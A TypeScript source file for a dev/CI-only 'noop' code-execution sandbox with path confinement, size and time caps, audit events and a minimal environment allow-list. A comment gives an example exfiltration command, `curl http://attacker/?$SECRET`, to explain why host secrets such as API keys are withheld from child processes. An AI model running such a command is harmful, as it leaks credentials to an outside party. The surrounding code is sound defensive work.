/**
 * Noop sandbox (Epic #395 #409).
 *
 * In-process implementation that runs commands via `child_process.spawn`
 * inside an isolated tmp directory. Has NO real isolation — only suitable
 * for offline dev and CI smoke tests. Enforces the same hard caps as the
 * real adapters so call sites cannot drift from production behaviour.
 */
import { spawn } from "node:child_process";
import { mkdir, readFile, rm, writeFile } from "node:fs/promises";
import { dirname, isAbsolute, join, normalize, relative, resolve } from "node:path";
import { ulid } from "ulid";

import type { SandboxAuditEmitter } from "../audit/audit-emitter.js";
import { SANDBOX_HARD_LIMITS } from "../limits.js";
import type { SandboxSessionRepo } from "../repos/sandbox-session.repo.js";
import type {
  ExecOptions,
  ExecResult,
  ReadFileOptions,
  Sandbox,
  SandboxAuditEventType,
  SandboxOutcome,
  SandboxProviderKind,
} from "../types.js";
import { SandboxLimitExceededError } from "../types.js";

export interface NoopSandboxDeps {
  sessionId: string;
  vendorSandboxId: string;
  projectId: string;
  userId: string | null;
  rootDir: string;
  timeoutMs: number;
  emitter: SandboxAuditEmitter;
  sessionRepo: SandboxSessionRepo;
  /** Test seam — override the watchdog's "now" so unit tests are deterministic. */
  now?: () => number;
}

/**
 * Single noop sandbox instance. Methods are safe to call concurrently.
 * `destroy()` is idempotent — re-entrant calls are no-ops after the first.
 */
export class NoopSandbox implements Sandbox {
  readonly id: string;
  readonly vendorSandboxId: string;
  readonly provider: SandboxProviderKind = "noop";

  private readonly rootDir: string;
  private readonly projectId: string;
  private readonly userId: string | null;
  private readonly timeoutMs: number;
  private readonly emitter: SandboxAuditEmitter;
  private readonly sessionRepo: SandboxSessionRepo;
  private readonly createdAtMs: number;
  private readonly now: () => number;
  private readonly watchdog: NodeJS.Timeout;
  private destroyed = false;
  private timedOut = false;
  private kernelVars: Record<string, unknown> = {};

  constructor(deps: NoopSandboxDeps) {
    this.id = deps.sessionId;
    this.vendorSandboxId = deps.vendorSandboxId;
    this.rootDir = deps.rootDir;
    this.projectId = deps.projectId;
    this.userId = deps.userId;
    this.timeoutMs = deps.timeoutMs;
    this.emitter = deps.emitter;
    this.sessionRepo = deps.sessionRepo;
    this.now = deps.now ?? (() => Date.now());
    this.createdAtMs = this.now();
    // Watchdog fires `timeoutMs + 5s` after creation regardless of activity
    // — guarantees no microVM survives past its declared deadline even if
    // the caller forgets to `destroy()`.
    this.watchdog = setTimeout(() => {
      void this.handleTimeout();
    }, deps.timeoutMs + 5_000);
    // Don't keep the Node event loop alive solely for the watchdog.
    if (typeof this.watchdog.unref === "function") this.watchdog.unref();
  }

  // ── Stateful kernel ──────────────────────────────────────────────────────

  /**
   * Stateful "kernel" — variables persist across calls within a session.
   * Implementation is intentionally tiny: parse `name = expr` / `name op=
   * expr` lines and the bare expression on the last line for the return
   * value. This is enough to mirror the kernel semantics that
   * `@e2b/code-interpreter` provides; production code calls runCode
   * through the real E2B adapter when isolation is required.
   */
  async runCode(code: string, opts?: ExecOptions): Promise<ExecResult> {
    this.assertAlive();
    const start = this.now();
    let stdout = "";
    const stderr = "";
    let exitCode = 0;
    try {
      const lines = code
        .split("\n")
        .map((l) => l.trim())
        .filter((l) => l.length > 0);
      let lastExpr: string | undefined;
      for (const line of lines) {
        const compoundMatch = /^([a-zA-Z_]\w*)\s*([+\-*/])=\s*(.+)$/.exec(line);
        const assignMatch = /^([a-zA-Z_]\w*)\s*=\s*(.+)$/.exec(line);
        if (compoundMatch) {
          const [, name, op, expr] = compoundMatch;
          const lhs = Number(this.kernelVars[name] ?? 0);
          const rhs = this.evalNum(expr);
          this.kernelVars[name] = applyOp(lhs, op, rhs);
          lastExpr = name;
        } else if (assignMatch) {
          const [, name, expr] = assignMatch;
          this.kernelVars[name] = this.evalNum(expr);
          lastExpr = name;
        } else {
          lastExpr = line;
        }
      }
      if (lastExpr !== undefined) {
        const value =
          lastExpr in this.kernelVars ? this.kernelVars[lastExpr] : this.evalNum(lastExpr);
        stdout = String(value);
      }
    } catch (err) {
      exitCode = 1;
      stdout = "";
      const message = (err as Error).message;
      opts?.onStderr?.(message);
      const result: ExecResult = {
        exitCode,
        stdout,
        stderr: message,
        durationMs: this.now() - start,
      };
      await this.emitExec("exec", code, result);
      return result;
    }
    opts?.onStdout?.(stdout);
    const result: ExecResult = {
      exitCode,
      stdout,
      stderr,
      durationMs: this.now() - start,
    };
    await this.emitExec("exec", code, result);
    return result;
  }

  // ── Shell ────────────────────────────────────────────────────────────────

  commands = {
    run: async (command: string, opts?: ExecOptions): Promise<ExecResult> => {
      this.assertAlive();
      const timeoutMs = clampInt(opts?.timeoutMs ?? this.timeoutMs, 100, this.timeoutMs);
      const start = this.now();
      const result = await spawnCommand({
        command,
        cwd: opts?.cwd ? this.resolveInside(opts.cwd) : this.rootDir,
        // CRITICAL: do NOT spread `process.env` here. The host env contains
        // E2B_API_KEY, DATABASE_URL, OPENAI_API_KEY, GITHUB_TOKEN, etc. —
        // model-generated commands could exfiltrate them via `env`,
        // `printenv`, or `curl http://attacker/?$SECRET`. Build a minimal
        // allow-list of innocuous shell defaults plus only the env vars
        // the caller explicitly passed in via `opts.env`.
        env: buildSandboxEnv(opts?.env),
        timeoutMs,
        onStdout: opts?.onStdout,
        onStderr: opts?.onStderr,
      });
      const exec: ExecResult = {
        exitCode: result.exitCode,
        stdout: result.stdout,
        stderr: result.stderr,
        durationMs: this.now() - start,
        truncated: result.truncated,
      };
      await this.emitExec("exec", command, exec);
      return exec;
    },
  };

  // ── Files ────────────────────────────────────────────────────────────────

  files = {
    read: async (path: string, opts?: ReadFileOptions): Promise<string | Uint8Array> => {
      this.assertAlive();
      const abs = this.resolveInside(path);
      const buf = await readFile(abs);
      await this.emitter.emit(this.ctx(), "download", {
        path: this.relInside(abs),
        bytes: buf.byteLength,
      });
      if (opts?.format === "bytes") return new Uint8Array(buf);
      return buf.toString("utf8");
    },
    write: async (path: string, data: string | Uint8Array): Promise<void> => {
      this.assertAlive();
      const buf = typeof data === "string" ? Buffer.from(data, "utf8") : Buffer.from(data);
      if (buf.byteLength > SANDBOX_HARD_LIMITS.maxFileWriteBytes) {
        await this.emitter.emit(this.ctx(), "upload", {
          path,
          bytes: buf.byteLength,
          reason: "file_size_cap_exceeded",
        });
        // Fail-stop: kill the sandbox and surface as "killed" outcome.
        const err = new SandboxLimitExceededError(
          "fileWriteBytes",
          buf.byteLength,
          SANDBOX_HARD_LIMITS.maxFileWriteBytes,
        );
        await this.killWithReason("file_size_cap_exceeded", err.message);
        throw err;
      }
      const abs = this.resolveInside(path);
      await mkdir(dirname(abs), { recursive: true });
      await writeFile(abs, buf);
      await this.emitter.emit(this.ctx(), "upload", {
        path: this.relInside(abs),
        bytes: buf.byteLength,
      });
    },
  };

  // ── Lifecycle ────────────────────────────────────────────────────────────

  async pause(): Promise<string> {
    this.assertAlive();
    const snapshotId = ulid();
    await this.emitter.emit(this.ctx(), "pause", { snapshotId });
    return snapshotId;
  }

  async resume(snapshotId: string): Promise<void> {
    this.assertAlive();
    await this.emitter.emit(this.ctx(), "resume", { snapshotId });
  }

  async destroy(): Promise<void> {
    if (this.destroyed) return;
    this.destroyed = true;
    clearTimeout(this.watchdog);
    const wallClockMs = this.now() - this.createdAtMs;
    const outcome: SandboxOutcome = this.timedOut ? "timeout" : "completed";
    try {
      await rm(this.rootDir, { recursive: true, force: true });
    } catch {
      /* best-effort cleanup */
    }
    try {
      await this.sessionRepo.finalize(this.id, {
        destroyedAt: new Date(),
        wallClockMs,
        outcome,
      });
    } catch {
      /* finalize failures must not block destroy — see emitter contract */
    }
    await this.emitter.emit(this.ctx(), this.timedOut ? "timeout" : "destroy", {
      durationMs: wallClockMs,
      outcome,
    });
  }

  // ── Internals ────────────────────────────────────────────────────────────

  private assertAlive(): void {
    if (this.destroyed) {
      throw new Error(`sandbox ${this.id} is destroyed`);
    }
  }

  private resolveInside(path: string): string {
    const candidate = isAbsolute(path) ? path : join(this.rootDir, path);
    const normalized = normalize(candidate);
    const rel = relative(this.rootDir, normalized);
    if (rel.startsWith("..") || isAbsolute(rel)) {
      throw new Error(`path '${path}' resolves outside the sandbox root`);
    }
    return resolve(this.rootDir, rel);
  }

  private relInside(abs: string): string {
    return relative(this.rootDir, abs) || ".";
  }

  private evalNum(expr: string): number {
    const trimmed = expr.trim();
    // Direct numeric literal.
    if (/^-?\d+(\.\d+)?$/.test(trimmed)) return Number(trimmed);
    // Reference to a known kernel variable.
    if (trimmed in this.kernelVars) {
      const value = this.kernelVars[trimmed];
      if (typeof value === "number") return value;
      if (typeof value === "string" && /^-?\d+(\.\d+)?$/.test(value)) {
        return Number(value);
      }
    }
    // Simple binary expression: lhs op rhs.
    const m = /^(.+?)\s*([+\-*/])\s*(.+)$/.exec(trimmed);
    if (m) {
      const [, lhsExpr, op, rhsExpr] = m;
      return applyOp(this.evalNum(lhsExpr), op, this.evalNum(rhsExpr));
    }
    throw new Error(`noop kernel cannot evaluate expression: ${expr}`);
  }

  private async emitExec(
    eventType: SandboxAuditEventType,
    command: string,
    result: ExecResult,
  ): Promise<void> {
    await this.emitter.emit(this.ctx(), eventType, {
      command,
      exitCode: result.exitCode,
      durationMs: result.durationMs,
      stdoutBytes: Buffer.byteLength(result.stdout, "utf8"),
      stderrBytes: Buffer.byteLength(result.stderr, "utf8"),
    });
  }

  private ctx() {
    return {
      sessionId: this.id,
      projectId: this.projectId,
      userId: this.userId,
      provider: this.provider,
    };
  }

  private async handleTimeout(): Promise<void> {
    if (this.destroyed) return;
    this.timedOut = true;
    await this.killWithReason(
      "watchdog_timeout",
      `sandbox exceeded wall-clock timeout of ${this.timeoutMs}ms`,
    );
  }

  private async killWithReason(reason: string, message: string): Promise<void> {
    if (this.destroyed) return;
    this.destroyed = true;
    clearTimeout(this.watchdog);
    const wallClockMs = this.now() - this.createdAtMs;
    try {
      await rm(this.rootDir, { recursive: true, force: true });
    } catch {
      /* best-effort */
    }
    try {
      await this.sessionRepo.finalize(this.id, {
        destroyedAt: new Date(),
        wallClockMs,
        outcome: "killed",
        errorMessage: message,
      });
    } catch {
      /* finalize failures must not block kill */
    }
    await this.emitter.emit(this.ctx(), "timeout", {
      reason,
      durationMs: wallClockMs,
      message,
    });
  }
}

// ── Helpers ─────────────────────────────────────────────────────────────────

function clampInt(value: number, min: number, max: number): number {
  const v = Math.trunc(value);
  if (v < min) return min;
  if (v > max) return max;
  return v;
}

/**
 * Minimal env exposed to noop-sandbox child processes.
 *
 * Host secrets (`E2B_API_KEY`, `DATABASE_URL`, `OPENAI_API_KEY`,
 * `GITHUB_TOKEN`, etc.) are NOT passed through. Only innocuous shell
 * defaults are inherited; everything else must be explicitly opted in
 * via `ExecOptions.env`.
 */
const SANDBOX_ALLOWED_ENV_KEYS: readonly string[] = [
  "PATH",
  "HOME",
  "LANG",
  "LC_ALL",
  "TZ",
  "USER",
];

export function buildSandboxEnv(callerEnv?: Record<string, string>): NodeJS.ProcessEnv {
  const out: NodeJS.ProcessEnv = {};
  for (const key of SANDBOX_ALLOWED_ENV_KEYS) {
    const value = process.env[key];
    if (value !== undefined) out[key] = value;
  }
  if (callerEnv) {
    for (const [k, v] of Object.entries(callerEnv)) {
      if (typeof v === "string") out[k] = v;
    }
  }
  return out;
}

function applyOp(lhs: number, op: string, rhs: number): number {
  switch (op) {
    case "+":
      return lhs + rhs;
    case "-":
      return lhs - rhs;
    case "*":
      return lhs * rhs;
    case "/":
      if (rhs === 0) throw new Error("division by zero");
      return lhs / rhs;
    default:
      throw new Error(`unsupported operator '${op}'`);
  }
}

interface SpawnOpts {
  command: string;
  cwd: string;
  env: NodeJS.ProcessEnv;
  timeoutMs: number;
  onStdout?: (chunk: string) => void;
  onStderr?: (chunk: string) => void;
}

interface SpawnResult {
  exitCode: number;
  stdout: string;
  stderr: string;
  truncated: boolean;
}

async function spawnCommand(opts: SpawnOpts): Promise<SpawnResult> {
  return new Promise<SpawnResult>((resolvePromise) => {
    // nosemgrep: javascript.lang.security.audit.spawn-shell-true.spawn-shell-true -- this is the dev/CI-only noop sandbox whose explicit contract is to execute an arbitrary shell command line (pipes, &&, etc.) inside an isolated tmp dir, mirroring the production sandbox adapters. Shell interpretation is required and intended; it is not selectable as a provider in production.
    const child = spawn(opts.command, {
      cwd: opts.cwd,
      env: opts.env,
      shell: "/bin/sh",
    });
    let stdoutLen = 0;
    let stderrLen = 0;
    const stdoutChunks: string[] = [];
    const stderrChunks: string[] = [];
    let truncated = false;
    let timedOut = false;
    const timer = setTimeout(() => {
      timedOut = true;
      child.kill("SIGKILL");
    }, opts.timeoutMs);
    if (typeof timer.unref === "function") timer.unref();
    child.stdout?.on("data", (data: Buffer) => {
      const remaining = SANDBOX_HARD_LIMITS.maxStreamCaptureBytes - stdoutLen;
      const chunk = data.toString("utf8");
      if (remaining <= 0) {
        truncated = true;
      } else if (data.byteLength > remaining) {
        const slice = data.subarray(0, remaining).toString("utf8");
        stdoutChunks.push(slice);
        stdoutLen += remaining;
        truncated = true;
      } else {
        stdoutChunks.push(chunk);
        stdoutLen += data.byteLength;
      }
      opts.onStdout?.(chunk);
    });
    child.stderr?.on("data", (data: Buffer) => {
      const remaining = SANDBOX_HARD_LIMITS.maxStreamCaptureBytes - stderrLen;
      const chunk = data.toString("utf8");
      if (remaining <= 0) {
        truncated = true;
      } else if (data.byteLength > remaining) {
        const slice = data.subarray(0, remaining).toString("utf8");
        stderrChunks.push(slice);
        stderrLen += remaining;
        truncated = true;
      } else {
        stderrChunks.push(chunk);
        stderrLen += data.byteLength;
      }
      opts.onStderr?.(chunk);
    });
    child.on("error", (err) => {
      clearTimeout(timer);
      resolvePromise({
        exitCode: 127,
        stdout: stdoutChunks.join(""),
        stderr: stderrChunks.join("") + (err as Error).message,
        truncated,
      });
    });
    child.on("close", (code, signal) => {
      clearTimeout(timer);
      const exitCode = timedOut ? 124 : typeof code === "number" ? code : signal ? 137 : 0;
      resolvePromise({
        exitCode,
        stdout: stdoutChunks.join(""),
        stderr: stderrChunks.join(""),
        truncated,
      });
    });
  });
}
